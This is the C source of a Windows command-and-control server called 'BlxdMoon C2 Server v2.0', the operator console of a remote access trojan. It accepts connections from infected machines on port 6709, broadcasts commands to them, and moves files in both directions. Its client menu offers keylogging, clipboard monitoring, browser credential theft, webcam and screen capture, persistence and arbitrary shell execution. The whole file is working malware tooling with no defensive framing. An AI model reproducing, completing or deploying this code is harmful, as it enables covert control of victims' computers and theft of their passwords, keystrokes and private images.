#include "status.h"
#include "str_cut.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <time.h>

#define bzero(p, size) (void)memset((p), 0, (size))
#define MAX_CLIENTS 100
#define BUFFER_SIZE 1024
#define RESPONSE_SIZE 18384

// Client structure
typedef struct {
    int id;
    SOCKET socket;
    struct sockaddr_in address;
    char ip[16];
    char hostname[64];
    char username[64];
    int active;
    HANDLE thread;
    time_t connected_at;
} Client;

// Global state
Client clients[MAX_CLIENTS];
int num_clients = 0;
int selected_client = -1;  // -1 = main menu, >=0 = interacting with client
SOCKET listen_sock = INVALID_SOCKET;
int server_running = 1;
CRITICAL_SECTION clients_lock;

// Forward declarations
void print_prompt(void);
void print_main_menu(void);
void print_client_list(void);
void handle_main_menu_command(char *cmd);
void handle_client_command(int client_id, char *cmd);
int add_client(SOCKET sock, struct sockaddr_in addr);
void remove_client(int client_id);
DWORD WINAPI accept_thread(LPVOID param);
DWORD WINAPI client_handler(LPVOID param);

// ASCII Art
void printAsciiArt()
{
    printf("\033[0;31m"
           "  ____  _         _ __  __                   \n"
           " |  _ \\| |       | |  \\/  |                  \n"
           " | |_) | |_  ____| | \\  / | ___   ___  _ __  \n"
           " |  _ <| \\ \\/ / _` | |\\/| |/ _ \\ / _ \\| '_ \\ \n"
           " | |_) | |>  < (_| | |  | | (_) | (_) | | | |\n"
           " |____/|_/_/\\_\\__,_|_|  |_|\\___/ \\___/|_| |_|\n"
           "\033[0m");
    printf("\n  \033[1;33mMulti-Client C2 Server v2.0\033[0m\n\n");
}

// Format time difference
void format_time_diff(time_t then, char *buffer)
{
    time_t now = time(NULL);
    int diff = (int)(now - then);

    if (diff < 60) {
        sprintf(buffer, "%ds ago", diff);
    } else if (diff < 3600) {
        sprintf(buffer, "%dm ago", diff / 60);
    } else if (diff < 86400) {
        sprintf(buffer, "%dh ago", diff / 3600);
    } else {
        sprintf(buffer, "%dd ago", diff / 86400);
    }
}

void print_prompt(void)
{
    if (selected_client < 0) {
        printf("\n\033[1;31mBlxd\033[0m\033[1;32mMoon\033[0m> ");
    } else {
        printf("\n\033[1;36mclient[%d]\033[0m> ", selected_client);
    }
    fflush(stdout);
}

void print_main_menu(void)
{
    printf("\n\033[1;33m=== BlxdMoon C2 Server ===\033[0m\n");
    printf("Connected clients: %d\n\n", num_clients);

    EnterCriticalSection(&clients_lock);
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i].active) {
            char time_str[32];
            format_time_diff(clients[i].connected_at, time_str);
            printf("  [\033[1;32m%d\033[0m] %s - %s (%s) - %s\n",
                   clients[i].id,
                   clients[i].ip,
                   clients[i].hostname[0] ? clients[i].hostname : "Unknown",
                   clients[i].username[0] ? clients[i].username : "Unknown",
                   time_str);
        }
    }
    LeaveCriticalSection(&clients_lock);

    if (num_clients == 0) {
        printf("  (No clients connected)\n");
    }

    printf("\n\033[1;33mCommands:\033[0m\n");
    printf("  select <id>     - Interact with a client\n");
    printf("  list            - Refresh client list\n");
    printf("  broadcast <cmd> - Send command to all clients\n");
    printf("  kick <id>       - Disconnect a client\n");
    printf("  exit            - Shutdown server\n");
}

void print_client_list(void)
{
    printf("\n\033[1;33mConnected Clients:\033[0m\n");

    EnterCriticalSection(&clients_lock);
    int count = 0;
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i].active) {
            char time_str[32];
            format_time_diff(clients[i].connected_at, time_str);
            printf("  [%d] %s - %s (%s) - %s\n",
                   clients[i].id,
                   clients[i].ip,
                   clients[i].hostname[0] ? clients[i].hostname : "Unknown",
                   clients[i].username[0] ? clients[i].username : "Unknown",
                   time_str);
            count++;
        }
    }
    LeaveCriticalSection(&clients_lock);

    printf("\nTotal: %d client(s)\n", count);
}

int add_client(SOCKET sock, struct sockaddr_in addr)
{
    EnterCriticalSection(&clients_lock);

    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (!clients[i].active) {
            clients[i].id = i;
            clients[i].socket = sock;
            clients[i].address = addr;
            strcpy(clients[i].ip, inet_ntoa(addr.sin_addr));
            clients[i].hostname[0] = '\0';
            clients[i].username[0] = '\0';
            clients[i].active = 1;
            clients[i].connected_at = time(NULL);
            num_clients++;

            LeaveCriticalSection(&clients_lock);
            return i;
        }
    }

    LeaveCriticalSection(&clients_lock);
    return -1;  // No space
}

void remove_client(int client_id)
{
    if (client_id < 0 || client_id >= MAX_CLIENTS) return;

    EnterCriticalSection(&clients_lock);

    if (clients[client_id].active) {
        closesocket(clients[client_id].socket);
        clients[client_id].active = 0;
        num_clients--;

        // If we were interacting with this client, go back to menu
        if (selected_client == client_id) {
            selected_client = -1;
            printf("\n\033[1;31m[!] Client %d disconnected\033[0m\n", client_id);
        }
    }

    LeaveCriticalSection(&clients_lock);
}

void broadcast_command(char *cmd)
{
    printf("\n[*] Broadcasting to %d clients...\n", num_clients);

    EnterCriticalSection(&clients_lock);

    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i].active) {
            send(clients[i].socket, cmd, strlen(cmd) + 1, 0);
        }
    }

    LeaveCriticalSection(&clients_lock);

    // Collect responses
    printf("[*] Collecting responses...\n");

    EnterCriticalSection(&clients_lock);

    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i].active) {
            char response[RESPONSE_SIZE];
            bzero(response, sizeof(response));

            // Set timeout for receive
            DWORD timeout = 5000;  // 5 seconds
            setsockopt(clients[i].socket, SOL_SOCKET, SO_RCVTIMEO,
                       (const char*)&timeout, sizeof(timeout));

            int received = recv(clients[i].socket, response, sizeof(response), 0);

            if (received > 0) {
                printf("\n\033[1;32m[Client %d]\033[0m\n%s\n", i, response);
            } else {
                printf("\n\033[1;31m[Client %d]\033[0m No response (timeout or disconnected)\n", i);
            }
        }
    }

    LeaveCriticalSection(&clients_lock);
}

void handle_main_menu_command(char *cmd)
{
    // Remove newline
    strtok(cmd, "\n");

    if (strlen(cmd) == 0) {
        return;
    }

    if (strncmp(cmd, "select ", 7) == 0) {
        int id = atoi(cmd + 7);
        if (id >= 0 && id < MAX_CLIENTS && clients[id].active) {
            selected_client = id;
            printf("\n[*] Now interacting with client %d (%s)\n", id, clients[id].ip);
            printf("    Type 'back' to return to main menu\n");
            printf("    Type 'help' for available commands\n");
        } else {
            printf("\n[-] Invalid client ID\n");
        }
    }
    else if (strcmp(cmd, "list") == 0) {
        print_client_list();
    }
    else if (strncmp(cmd, "broadcast ", 10) == 0) {
        broadcast_command(cmd + 10);
    }
    else if (strncmp(cmd, "kick ", 5) == 0) {
        int id = atoi(cmd + 5);
        if (id >= 0 && id < MAX_CLIENTS && clients[id].active) {
            printf("\n[*] Kicking client %d...\n", id);
            send(clients[id].socket, "q", 2, 0);  // Send quit command
            remove_client(id);
            printf("[+] Client %d disconnected\n", id);
        } else {
            printf("\n[-] Invalid client ID\n");
        }
    }
    else if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "quit") == 0) {
        printf("\n[*] Shutting down server...\n");
        server_running = 0;
    }
    else if (strcmp(cmd, "help") == 0) {
        print_main_menu();
    }
    else if (strcmp(cmd, "clear") == 0 || strcmp(cmd, "cls") == 0) {
        system("cls");
        printAsciiArt();
    }
    else {
        printf("\n[-] Unknown command. Type 'help' for available commands.\n");
    }
}

void handle_client_command(int client_id, char *cmd)
{
    // Remove newline
    strtok(cmd, "\n");

    if (strlen(cmd) == 0) {
        return;
    }

    if (strcmp(cmd, "back") == 0) {
        selected_client = -1;
        printf("\n[*] Returned to main menu\n");
        return;
    }

    if (strcmp(cmd, "help") == 0) {
        printf("\n\033[1;33mAvailable Commands:\033[0m\n");
        printf("  back            - Return to main menu\n");
        printf("  info            - Get system information\n");
        printf("  ps              - List running processes\n");
        printf("  kill:<pid>      - Kill a process\n");
        printf("  screen          - Take a screenshot\n");
        printf("  keylogger:start - Start keylogger\n");
        printf("  clipboard:start - Start clipboard monitor\n");
        printf("  clipboard:dump  - Get clipboard contents\n");
        printf("  browser:creds   - Extract browser credentials\n");
        printf("  webcam          - Capture webcam frame\n");
        printf("  upload <file>   - Upload file to client\n");
        printf("  download <file> - Download file from client\n");
        printf("  persist         - Add persistence\n");
        printf("  cd <dir>        - Change directory\n");
        printf("  <any command>   - Execute shell command\n");
        printf("  q               - Disconnect client\n");
        return;
    }

    EnterCriticalSection(&clients_lock);

    if (!clients[client_id].active) {
        LeaveCriticalSection(&clients_lock);
        printf("\n[-] Client disconnected\n");
        selected_client = -1;
        return;
    }

    SOCKET client_socket = clients[client_id].socket;
    LeaveCriticalSection(&clients_lock);

    char buffer[BUFFER_SIZE];
    char response[RESPONSE_SIZE];
    bzero(buffer, sizeof(buffer));
    bzero(response, sizeof(response));

    // Handle upload command
    if (strncmp(cmd, "upload ", 7) == 0) {
        char *filename = cmd + 7;
        FILE *file = fopen(filename, "rb");

        if (file == NULL) {
            printf("\n[-] File %s not found.\n", filename);
            return;
        }

        fseek(file, 0, SEEK_END);
        int size = ftell(file);
        rewind(file);

        char *file_contents = malloc(size);
        fread(file_contents, 1, size, file);
        fclose(file);

        char upload_cmd[RESPONSE_SIZE];
        sprintf(upload_cmd, "file:%d:%s:%s", size, filename, file_contents);
        free(file_contents);

        send(client_socket, upload_cmd, strlen(upload_cmd) + 1, 0);
        recv(client_socket, response, sizeof(response), 0);
        success(response);
        return;
    }

    // Handle download command
    if (strncmp(cmd, "download ", 9) == 0) {
        send(client_socket, cmd, strlen(cmd) + 1, 0);
        recv(client_socket, response, sizeof(response), 0);

        if (strncmp(response, "file:", 5) == 0) {
            char *parts[4];
            int i = 0;
            char *token = strtok(response, ":");
            while (token != NULL && i < 4) {
                parts[i++] = token;
                token = strtok(NULL, ":");
            }

            int filesize = atoi(parts[1]);
            char *filename = parts[2];
            char *file_contents = parts[3];

            FILE *file = fopen(filename, "wb");
            fwrite(file_contents, 1, filesize, file);
            fclose(file);

            printf("\n[+] Downloaded %s (%d bytes)\n", filename, filesize);
        } else {
            success(response);
        }
        return;
    }

    // Handle quit command
    if (strcmp(cmd, "q") == 0) {
        send(client_socket, cmd, strlen(cmd) + 1, 0);
        remove_client(client_id);
        printf("\n[+] Client disconnected\n");
        selected_client = -1;
        return;
    }

    // Send command and receive response
    send(client_socket, cmd, strlen(cmd) + 1, 0);

    // Skip receive for certain commands
    if (strcmp(cmd, "keylogger:start") == 0) {
        printf("\n[+] Keylogger started on client\n");
        return;
    }

    recv(client_socket, response, sizeof(response), 0);
    printf("\n%s", response);
}

DWORD WINAPI accept_thread(LPVOID param)
{
    struct sockaddr_in client_address;
    int client_length = sizeof(client_address);

    while (server_running) {
        SOCKET client_socket = accept(listen_sock,
                                       (struct sockaddr *)&client_address,
                                       &client_length);

        if (client_socket == INVALID_SOCKET) {
            if (server_running) {
                // Real error
                continue;
            }
            break;  // Server shutting down
        }

        int id = add_client(client_socket, client_address);
        if (id >= 0) {
            printf("\n\033[1;32m[+] New client connected: %s (ID: %d)\033[0m",
                   inet_ntoa(client_address.sin_addr), id);
            print_prompt();

            // Request info from client
            char info_cmd[] = "info";
            send(client_socket, info_cmd, sizeof(info_cmd), 0);

            char info_response[BUFFER_SIZE];
            int received = recv(client_socket, info_response, sizeof(info_response), 0);
            if (received > 0) {
                // Parse hostname and username from info response
                char *line = strtok(info_response, "\n");
                while (line != NULL) {
                    if (strncmp(line, "Computer name: ", 15) == 0) {
                        strncpy(clients[id].hostname, line + 15, 63);
                    } else if (strncmp(line, "Username: ", 10) == 0) {
                        strncpy(clients[id].username, line + 10, 63);
                    }
                    line = strtok(NULL, "\n");
                }
            }
        } else {
            // Too many clients
            closesocket(client_socket);
        }
    }

    return 0;
}

int main()
{
    // Initialize
    printAsciiArt();
    InitializeCriticalSection(&clients_lock);

    // Initialize all client slots
    for (int i = 0; i < MAX_CLIENTS; i++) {
        clients[i].active = 0;
    }

    // Initialize WinSock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        error("Couldn't initiate WinSock.");
        return 1;
    }

    // Create listening socket
    listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_sock == INVALID_SOCKET) {
        error("Failed to create socket.");
        WSACleanup();
        return 1;
    }

    // Set socket options
    int optval = 1;
    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, (const char *)&optval, sizeof(optval));

    // Bind
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("0.0.0.0");
    server_address.sin_port = htons(6709);

    if (bind(listen_sock, (struct sockaddr *)&server_address, sizeof(server_address)) == SOCKET_ERROR) {
        error("Failed to bind socket. Port may be in use.");
        closesocket(listen_sock);
        WSACleanup();
        return 1;
    }

    // Listen
    if (listen(listen_sock, SOMAXCONN) == SOCKET_ERROR) {
        error("Failed to listen on socket.");
        closesocket(listen_sock);
        WSACleanup();
        return 1;
    }

    info("[*] Server listening on 0.0.0.0:6709");
    info("[*] Waiting for connections...\n");

    // Start accept thread
    HANDLE hAcceptThread = CreateThread(NULL, 0, accept_thread, NULL, 0, NULL);

    // Show menu
    print_main_menu();

    // Main input loop
    char input[BUFFER_SIZE];

    while (server_running) {
        print_prompt();
        bzero(input, sizeof(input));

        if (fgets(input, sizeof(input), stdin) == NULL) {
            break;
        }

        if (selected_client < 0) {
            handle_main_menu_command(input);
        } else {
            handle_client_command(selected_client, input);
        }
    }

    // Cleanup
    printf("\n[*] Closing all connections...\n");

    EnterCriticalSection(&clients_lock);
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i].active) {
            send(clients[i].socket, "q", 2, 0);
            closesocket(clients[i].socket);
        }
    }
    LeaveCriticalSection(&clients_lock);

    closesocket(listen_sock);
    WaitForSingleObject(hAcceptThread, 1000);
    CloseHandle(hAcceptThread);

    DeleteCriticalSection(&clients_lock);
    WSACleanup();

    printf("[+] Server shutdown complete.\n");
    return 0;
}
